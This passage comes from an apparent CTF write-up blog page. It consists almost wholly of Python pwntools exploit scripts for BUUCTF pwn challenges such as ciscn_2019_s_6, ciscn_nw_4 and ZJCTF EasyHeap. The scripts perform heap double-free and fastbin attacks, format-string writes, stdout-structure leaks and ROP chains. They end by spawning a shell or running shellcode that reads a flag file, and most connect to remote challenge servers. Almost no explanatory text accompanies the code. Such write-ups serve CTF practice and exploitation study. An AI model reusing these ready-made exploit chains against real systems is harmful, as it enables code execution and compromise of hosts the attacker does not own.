free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	free(0)</span><br><span class="line">	add(0x68,p64(fastbin_attack))</span><br><span class="line">	add(0x68,p64(fastbin_attack))</span><br><span class="line">	add(0x68,p64(fastbin_attack))</span><br><span class="line">	offset = 16</span><br><span class="line">	payload = '\x00' * 3</span><br><span class="line">	payload += '\x00' * offset</span><br><span class="line">	payload += p64(pop_rdi_ret)</span><br><span class="line">	payload += p64(0)</span><br><span class="line">	payload += p64(libc + lib.search(asm("pop rsi\nret")).next())</span><br><span class="line">	payload += p64(ret_addr)</span><br><span class="line">	payload += p64(libc + lib.search(asm("pop rdx\nret")).next())</span><br><span class="line">	payload += p64(0x100)</span><br><span class="line">	payload += p64(libc + lib.symbols['read'])</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	add(0x68,payload)</span><br><span class="line">	offset = 0x40 - 0x8</span><br><span class="line">	payload = '\x00' * offset</span><br><span class="line">	payload += p64(pop_rdi_ret)</span><br><span class="line">	payload += p64((elf.bss() >> 12) << 12)</span><br><span class="line">	payload += p64(libc + lib.search(asm("pop rsi\nret")).next())</span><br><span class="line">	payload += p64(0x2000)</span><br><span class="line">	payload += p64(libc + lib.search(asm("pop rdx\nret")).next())</span><br><span class="line">	payload += p64(7)</span><br><span class="line">	payload += p64(libc + lib.symbols['mprotect'])</span><br><span class="line">	payload += p64(pop_rdi_ret)</span><br><span class="line">	payload += p64(0)</span><br><span class="line">	payload += p64(libc + lib.search(asm("pop rsi\nret")).next())</span><br><span class="line">	payload += p64(((elf.bss() >> 12) << 12) + 0x800)</span><br><span class="line">	payload += p64(libc + lib.search(asm("pop rdx\nret")).next())</span><br><span class="line">	payload += p64(0x200)</span><br><span class="line">	payload += p64(libc + lib.symbols['read'])</span><br><span class="line">	payload += p64(((elf.bss() >> 12) << 12) + 0x800)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	shellcode  = shellcraft.amd64.openat(0,"/flag.txt",0)</span><br><span class="line">	shellcode += shellcraft.amd64.read(3,elf.bss(),0x30)</span><br><span class="line">	shellcode += shellcraft.amd64.write(1,elf.bss(),0x30)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.send(asm(shellcode))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("pwn.buuoj.cn",20222,0)</span><br></pre></td></tr></tbody></table></figure></div>


<h2 id="0x50-ciscn-2019-s-6"><a href="#0x50-ciscn-2019-s-6" class="headerlink" title="0x50 ciscn_2019_s_6"></a>0x50 ciscn_2019_s_6</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_s_6")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size,name,phone):</span><br><span class="line">	sh.recvuntil("choice:")</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	sh.recvuntil("Please input the size of compary's name")</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil("please input name:")</span><br><span class="line">	sh.send(name)</span><br><span class="line">	sh.recvuntil("please input compary call:")</span><br><span class="line">	sh.send(phone)</span><br><span class="line">def show(idx):</span><br><span class="line">	sh.recvuntil("choice:")</span><br><span class="line">	sh.sendline("2")</span><br><span class="line">	sh.recvuntil("Please input the index:")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil("choice:")</span><br><span class="line">	sh.sendline("3")</span><br><span class="line">	sh.recvuntil("Please input the index:")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_s_6")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line">	add(0xF0,'a' * 0x80,'\x00' * 0x4 + p64(0x61)) #idx 0</span><br><span class="line">	add(0x58,'b' * 0x58,'\x00' * 0x4 + p64(0x61)) #idx 1</span><br><span class="line">	add(0x58,'c' * 0x58,'\x00' * 0x4 + p64(0x61)) #idx 2</span><br><span class="line">	add(0x68,'d' * 0x68,'\x00' * 4 + p64(0x61))   #idx 3</span><br><span class="line">	add(0x68,'e' * 0x68,'\x00' * 4 + p64(0x61))   #idx 4</span><br><span class="line">	free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	free(2)</span><br><span class="line">	show(0)</span><br><span class="line">	main_arena = u64(sh.recvuntil("\x7f",False)[-6:].ljust(8,'\x00')) - 88</span><br><span class="line">	libc = main_arena - 0x10 - lib.symbols['__malloc_hook']</span><br><span class="line">	__free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">	system = libc + lib.symbols['system']</span><br><span class="line">	free(1)</span><br><span class="line">	free(3)</span><br><span class="line">	free(4)</span><br><span class="line">	free(3)</span><br><span class="line">	show(2)</span><br><span class="line">	heap_base = u64(sh.recvuntil("\x0a\x70\x68",True)[-6:].ljust(8,'\x00'))</span><br><span class="line">	heap_base = (heap_base >> 12) << 12</span><br><span class="line">	add(0x58,p64(heap_base + 0xD8),'\x00' * 4 + p64(0x61)) #idx 5</span><br><span class="line">	add(0x58,"/bin/sh\x00",'\x00' * 4 + p64(0x61)) #idx 6</span><br><span class="line">	add(0x58,p64(heap_base + 0xD8),'\x00' * 4 + p64(0x61)) #idx 7</span><br><span class="line">	for i in range(0,3):</span><br><span class="line">		add(0x68,p64(__free_hook - 0x43),'\x00' * 4 + p64(0x61)) #idx 8-10</span><br><span class="line">	payload  = p64(0x21) + p64(heap_base + 0xe8) + p64(0x58) + p64(0) + p64(0x21)</span><br><span class="line">	payload += p64(main_arena + 88) + p64(__free_hook - 0x40 - 0x10)</span><br><span class="line">	add(0x58,payload,'\x00' * 4 + p64(0x61))#idx 11</span><br><span class="line">	payload = '\x00' * 3 + p64(0) * 6 + p64(system)</span><br><span class="line">	add(0x68,payload,'\x00' * 4 + p64(0x61)) #idx 12</span><br><span class="line">	free(6)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("pwn.buuoj.cn",20157,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x51-ciscn-nw-4"><a href="#0x51-ciscn-nw-4" class="headerlink" title="0x51 ciscn_nw_4"></a>0x51 ciscn_nw_4</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_nw_4")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.sendlineafter(">>","1")</span><br><span class="line">	sh.sendlineafter("?",str(size))</span><br><span class="line">	sh.sendafter("?",content)</span><br><span class="line">def show(idx):</span><br><span class="line">	sh.sendlineafter(">>","3")</span><br><span class="line">	sh.sendlineafter("?",str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.sendlineafter(">>","2")</span><br><span class="line">	sh.sendlineafter("?",str(idx))</span><br><span class="line">def inputName(content):</span><br><span class="line">	sh.sendafter("what is your name?",content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_nw_4")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line">	inputName(p64(0x61) * (0x100 / 8))</span><br><span class="line">	add(0x68,'\x11' * 0x68)</span><br><span class="line">	add(0x68,'\x12' * 0x68)</span><br><span class="line">	payload = '\x13' * 0x50 + p64(0) + p64(0x71)</span><br><span class="line">	add(0x68,payload)	</span><br><span class="line">	add(0x88,'\x14' * 0x88)</span><br><span class="line">	add(0x38,'\x15' * 0x38)</span><br><span class="line">	add(0x38,'\x15' * 0x38)</span><br><span class="line">	add(0x58,'%17$paaaa%54$p')</span><br><span class="line">	free(3)</span><br><span class="line">	show(3)</span><br><span class="line">	main_arena = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00')) - 88</span><br><span class="line">	libc = main_arena - 0x10 - lib.symbols['__malloc_hook']</span><br><span class="line">	system = libc +lib.symbols['system']</span><br><span class="line">	binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">	__free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line">	__malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line">	stdout = libc + lib.symbols['_IO_2_1_stdout_']</span><br><span class="line">	printf = libc + lib.symbols['printf']</span><br><span class="line">	free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	free(0)</span><br><span class="line">	show(0)</span><br><span class="line">	heap_base = (u64(sh.recvuntil('\n--------------------',True)[-3:].ljust(8,'\x00')) >> 8) << 8</span><br><span class="line">	add(0x68,p64(stdout - 0x43))</span><br><span class="line">	add(0x68,p64(stdout - 0x43))</span><br><span class="line">	add(0x68,p64(stdout - 0x43))</span><br><span class="line">	payload = '\x00' * 3</span><br><span class="line">	payload += p64(0) * 6</span><br><span class="line">	payload += p64(0xfbad1800) + p64(0) * 3 + p64(libc + lib.symbols['environ']) + p64(libc + lib.symbols['environ'] + 0x8)</span><br><span class="line">	add(0x68,payload)</span><br><span class="line">	stack_end = u64(sh.recvuntil("--------------------",True)[-8:])</span><br><span class="line">	canary_pos = stack_end - (0xe548 - 0xe448)</span><br><span class="line">	fastbin_attack = stack_end - 0x7fffffffe548 + 0x7fffffffe2c5 + 8</span><br><span class="line">	ret_addr = stack_end - 0x7fffe75e88f8 + 0x7fffe75e86b8</span><br><span class="line">	free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	free(0)</span><br><span class="line">	add(0x68,p64(stdout - 0x43))</span><br><span class="line">	add(0x68,p64(stdout - 0x43))</span><br><span class="line">	add(0x68,p64(stdout - 0x43))</span><br><span class="line">	payload = '\x00' * 3</span><br><span class="line">	payload += p64(0) * 6</span><br><span class="line">	payload += p64(0xfbad1800) + p64(0) * 3 + p64(canary_pos) + p64(canary_pos + 0x8)</span><br><span class="line">	add(0x68,payload)</span><br><span class="line">	canary = u64(sh.recvuntil("--------------------",True)[-8:])</span><br><span class="line">	pop_rdi_ret = 0x400d43</span><br><span class="line">	free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	free(0)</span><br><span class="line">	add(0x68,p64(fastbin_attack))</span><br><span class="line">	add(0x68,p64(fastbin_attack))</span><br><span class="line">	add(0x68,p64(fastbin_attack))</span><br><span class="line">	offset = 40</span><br><span class="line">	payload = '\x00' * 3</span><br><span class="line">	payload += '\x00' * offset</span><br><span class="line">	payload += p64(pop_rdi_ret)</span><br><span class="line">	payload += p64(0)</span><br><span class="line">	payload += p64(libc + lib.search(asm("pop rsi\nret")).next())</span><br><span class="line">	payload += p64(ret_addr)</span><br><span class="line">	payload += p64(libc + lib.search(asm("pop rdx\nret")).next())</span><br><span class="line">	payload += p64(0x100)</span><br><span class="line">	payload += p64(libc + lib.symbols['read'])</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	add(0x68,payload)</span><br><span class="line">	offset = 56</span><br><span class="line">	payload = '\x00' * offset</span><br><span class="line">	payload += p64(pop_rdi_ret)</span><br><span class="line">	payload += p64((elf.bss() >> 12) << 12)</span><br><span class="line">	payload += p64(libc + lib.search(asm("pop rsi\nret")).next())</span><br><span class="line">	payload += p64(0x2000)</span><br><span class="line">	payload += p64(libc + lib.search(asm("pop rdx\nret")).next())</span><br><span class="line">	payload += p64(7)</span><br><span class="line">	payload += p64(libc + lib.symbols['mprotect'])</span><br><span class="line">	payload += p64(pop_rdi_ret)</span><br><span class="line">	payload += p64(0)</span><br><span class="line">	payload += p64(libc + lib.search(asm("pop rsi\nret")).next())</span><br><span class="line">	payload += p64(((elf.bss() >> 12) << 12) + 0x800)</span><br><span class="line">	payload += p64(libc + lib.search(asm("pop rdx\nret")).next())</span><br><span class="line">	payload += p64(0x100)</span><br><span class="line">	payload += p64(libc + lib.symbols['read'])</span><br><span class="line">	payload += p64(((elf.bss() >> 12) << 12) + 0x800)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	shellcode  = shellcraft.amd64.open("./flag.txt")</span><br><span class="line">	shellcode += shellcraft.amd64.read(3,elf.bss(),0x30)</span><br><span class="line">	shellcode += shellcraft.amd64.write(1,elf.bss(),0x30)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.send(asm(shellcode))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("pwn.buuoj.cn",20149,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x52-第五空间2019-决赛-PWN5"><a href="#0x52-第五空间2019-决赛-PWN5" class="headerlink" title="0x52 [第五空间2019 决赛]PWN5"></a>0x52 [第五空间2019 决赛]PWN5</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("pwn")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./pwn")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	sh.sendlineafter(":",p32(0x0804C044) + "%10$n")</span><br><span class="line">	sh.sendlineafter("passwd","4")</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("node2.buuoj.cn.wetolink.com",28856,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x53-ZJCTF-2019-EasyHeap"><a href="#0x53-ZJCTF-2019-EasyHeap" class="headerlink" title="0x53 [ZJCTF 2019]EasyHeap"></a>0x53 [ZJCTF 2019]EasyHeap</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("easyheap")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">	sh.sendlineafter("Your choice :","2")</span><br><span class="line">	sh.sendlineafter(":",str(idx))</span><br><span class="line">	sh.sendlineafter(":",str(size))</span><br><span class="line">	sh.sendafter(":",content)</span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.sendlineafter("Your choice :","1")</span><br><span class="line">	sh.sendlineafter(":",str(size))</span><br><span class="line">	sh.sendlineafter(":",content)</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.sendlineafter("Your choice :","3")</span><br><span class="line">	sh.sendlineafter(":",str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./easyheap")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">	add(0x68,'')</span><br><span class="line">	add(0x68,'')</span><br><span class="line">	add(0x68,'')</span><br><span class="line">	free(2)</span><br><span class="line">	payload = '/bin/sh\x00'</span><br><span class="line">	payload = payload.ljust(0x68,'a')</span><br><span class="line">	payload += p64(0x71) + p64(0x6020ad)</span><br><span class="line">	edit(1,0x200,payload)</span><br><span class="line">	add(0x68,'')</span><br><span class="line">	add(0x68,'')</span><br><span class="line">	payload = '\xaa' * 3 + p64(0) * 4 + p64(elf.got['free'])</span><br><span class="line">	edit(3,len(payload) + 0x100,payload)</span><br><span class="line">	edit(0,9,p64(elf.plt['system']))</span><br><span class="line">	free(1)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("127.0.0.1",9999,1)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x54-ZJCTF-2019-login"><a href="#0x54-ZJCTF-2019-login" class="headerlink" title="0x54 [ZJCTF 2019]login"></a>0x54 [ZJCTF 2019]login</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("login")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./login")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">	payload = "admin\x00"</span><br><span class="line">	sh.sendlineafter(":",payload)</span><br><span class="line">	sh.recvuntil(":")</span><br><span class="line">	payload = "2jctf_pa5sw0rd\x00"</span><br><span class="line">	payload += "aaaabaaac\x00aadaaaeaaafaaagaaahayyyyyyyyyyyyyyyyyyyyyyyyyyy" + p64(0x400E9E)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("127.0.0.1",9999,1)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x55-ciscn-2019-n-5"><a href="#0x55-ciscn-2019-n-5" class="headerlink" title="0x55 ciscn_2019_n_5"></a>0x55 ciscn_2019_n_5</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_n_5")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_2019_n_5")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line">	pop_rdi_ret = elf.search(asm("pop rdi\nret")).next()</span><br><span class="line">	pop_rsi_r15_ret = elf.search(asm("pop rsi\npop r15\nret")).next()</span><br><span class="line">	sh.sendlineafter("name",'111')</span><br><span class="line">	offset = 40</span><br><span class="line">	payload  = offset * "a"</span><br><span class="line">	payload += p64(pop_rdi_ret) + p64(elf.got['__libc_start_main']) + p64(elf.plt['puts']) + p64(elf.symbols['main'])</span><br><span class="line">	sh.sendlineafter("?",payload)</span><br><span class="line">	__libc_start_main = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00'))</span><br><span class="line">	libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">	system = libc +lib.symbols['system']</span><br><span class="line">	binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">	sh.sendlineafter("name",'111')</span><br><span class="line">	offset = 40</span><br><span class="line">	payload  = offset * "a"</span><br><span class="line">	payload += p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br><span class="line">	sh.sendlineafter("?",payload)</span><br><span class="line">	log.success("libc: " + hex(libc))</span><br><span class="line">	log.success("system: " + hex(system))</span><br><span class="line">	log.success("binsh: " + hex(binsh))</span><br><span class="line">	log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">	log.success("__malloc_hook: " + hex(__malloc_hook))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("pwn.buuoj.cn",20141,0)</span><br></pre></td></tr></tbody></table></figure></div>

